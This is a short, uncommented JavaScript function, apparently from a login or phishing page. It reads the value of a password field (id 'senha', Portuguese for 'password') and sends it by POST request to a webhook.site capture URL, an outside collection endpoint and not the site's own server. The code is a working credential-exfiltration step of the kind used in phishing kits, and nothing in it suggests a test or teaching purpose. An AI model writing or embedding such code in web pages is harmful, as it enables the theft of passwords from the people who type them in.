
	
	
	
function envia_post() { 
	const senha = document.getElementById("senha").value
	const json =  {"senha": senha};
	const options = {
    method: 'POST',
    body: JSON.stringify(json),
    headers: {
		
        'Content-Type': 'text/plain'
    }
}

fetch('https://webhook.site/f5000310-e98c-48ec-9867-5916fefe93ff', options)
   .then(res => res.json())
   .then(res => console.log(res))
  .catch(err => console.error(err));	
}
   